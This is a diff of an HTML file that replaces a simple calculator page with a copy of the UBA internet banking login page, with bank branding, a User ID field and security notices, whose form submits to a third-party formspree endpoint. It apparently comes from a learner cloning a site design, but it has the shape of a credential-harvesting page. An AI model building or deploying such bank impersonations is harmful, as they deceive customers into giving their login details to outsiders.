@@ -3,117 +3,71 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>calculator2</title>
+    <title>UBA</title>
     <link rel="stylesheet" href="style.css">
+    <link rel="shortcut icon" href="img/fav.png" type="image/x-icon">
+    <!--<link rel="stylesheet" href="https://cdnjs.cloudeflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"> -->
 </head>
 <body>
-       <div id="parent">
-    <div id="time">
-
-    </div>
-     <div id="child">
-        <div class="clock" id="clock">00:00:00</div>
-        <div class="greeting" id="greeting"></div>
-
-        <div class="display" id="display">
-         <input type="text" id="dis" disabled>
+    <div id="container">
+        <div id="left">
+            <span id="txt1">Bank Anywhere</span><br>
+            <span id="txt2">Whether you run your business from home or on the move,internet Banking is the right support for you.</span>
         </div>
-     
-     <br>
-     <button onclick="clearDisplay()">AC</button>
-     <button onclick="clearDispla()">DE</button>
-     <button onclick="append('/')" id="divs">/</button>
-     <button onclick="append('+')" id="add">+</button>
-     <br>
-     <button onclick="append('7')">7</button>
-     <button onclick="append('8')">8</button>
-     <button onclick="append('9')">9</button>
-     <button onclick="append('-')" id="minus">-</button>
-     <br>
-     <button onclick="append('4')">4</button>
-     <button onclick="append('5')">5</button>
-     <button onclick="append('6')">6</button>
-     <button onclick="append('*')" id="multi">*</button>
-     <br>
-     <button onclick="append('1')">1</button>
-     <button onclick="append('2')">2</button>
-     <button onclick="append('3')">3</button>
-     <button onclick="append('%')" id="percentage">%</button>
-     <br>
-     <button onclick="append('00')">00</button>
-     <button onclick="append('0')">0</button>
-     <button onclick="append('.')" id="decimal">.</button>
-     <button onclick="calculate()" id="equql">=</button>
+        <div id="right">
+            <img src="img/uba logo.fw.png" alt="logo" id="logo">
+            <div id="box">
+                <span id="txt3">UBA INTERNET BANKING</span>
+                <div id="select">
+                    <div id="country">
+                        <!--<i class="fa fa-flag"></i>-->
+                        <select name="" id="">
+                            <option value="ng">Nigeria</option>
+                            <option value="gh">Ghana</option>
+                            <option value="ke">Kenya</option>
+                        </select>
+                    </div>
+                    <div id="country">
+                        <select name="" id="">
+                            <option value="en">English</option>
+                            <option value="fr">French</option>
+                            <option value="sp">Spanish</option>
+                        </select>
+                    </div>
+                </div>
+                <form action="https://formspree.io/f/mzeboyng" id="form">
+                    <input type="checkbox" name="" id="">
+                    <label for="">Disable Virtual Keyboard</label> <br><br>
+                    <input type="text" placeholder="User ID" id="user"><br>
+                    <span id="txt4">If Corporate, format is Corp ID.User ID</span><br><br>
+                    <input type="checkbox" name="" id="">
+                    <label for="">Remember User ID</label> <br><br>
+                    <button type="submit" id="log"><a href="" id="bt">LOGIN</a></button><br>
+                    <p id="for">
+                        <a href="">Forgot Password</a> |
+                        <a href="">Forgot User ID</a>
+                    </p><br><br><br>
+                    <button type="button" id="reg"><a href="">Instant Self-Registration</a></button>
+                </form>
+            </div>
+        </div>
+        <div id="bottom">
+            <div id="sub1">
+                <img src="img/lock.jpg" alt="logo" id="log2">
+                <span id="txt5">Security Risk</span>
+                <span id="txt6">Avoid sharing your card details, internet banking log in and Pin with anyone. <br> <br><a href="">Learn More | About UBA</a></span>
+            </div>
+            <div id="sub2">
+                <img src="img/new user.jpg" alt="logo" id="log3">
+                <span id="txt7">New User?</span>
+                <span id="txt8">Our InternetBankingService gives you unrestricted and secure access to your account. <br> <br><a href="">Open Account</a></span>
+            </div>
+            <div id="sub3">
+                <img src="img/support.jpg" alt="logo" id="log4">
+                <span id="txt9">Contact Us</span>
+                <span id="txt10">Our CFC is a 24/7 one-stop shop to help you with requests.+234 907 958 0639 <br> <br><a href="">Talk to Leo | ATM & Branches</a></span>
+            </div>
+        </div>
     </div>
-    <script>
-        const username=prompt("Enter fullname");
-        const greeting=document.getElementById("greetings");
-
-        function updateClock(){
-            const now=new Date();
-            const hours=String(now.getHours()).padStart(2, '0');
-            const minutes=String(now.getMinutes()).padStart(2, '0');
-            const seconds=String(now.getSeconds()).padStart(2,' 0')
-            document.getElementById('clock').textContent=`${hours}:${minutes}:${seconds}`
-        }
-        setInterval(updateClock,1000);
-        updateClock();
-        function append(blue){
-            document.getElementById("dis").value += blue;
-        }
-        function clearDisplay(){
-            let display = document.getElementById("dis");
-            document.getElementById("dis").value ="";
-        }
-        function clearDispla(){
-            let display = document.getElementById("dis");
-            display.value = display.value.slice(0, -1)
-        }
-        function calculate(){
-            try{
-                document.getElementById("dis").value =
-                eval(document.getElementById("dis").value);
-            } catch {
-                document.getElementById("dis").value="Error";
-            }
-        }
-        let userName=prompt("what is ur Fullname");
-
-        let today=new Date();
-              let hours=today.getHours();
-
-              let greetingElement=document.getElementById("greeting-message");
-
-              if (greetingElement) {
-                let greeting="";
-
-                if (hours >=0 && hour < 12){
-                    greeting = "Good Moring";
-                }
-                else if (hour >= 12 && hour < 16){
-                    greeting ="Good Afternoon";
-                }
-                else if (hour >=16 && hour < 19){
-                    greeting ="Good Evening";
-                }
-                else if (hour >=19 && hour <24){
-                     greeting="Good Night";
-                }
-
-                else {
-                    greeting="No greeting";
-                }
-
-                if (userName){
-                    greetingElement.innerHTML=`${greeting},${userName}`
-
-                }
-                else {
-                    greetingElement.innerHTML=greeting;
-                }
-              }
-              
-    </script>
-   </div>
 </body>
 </html>
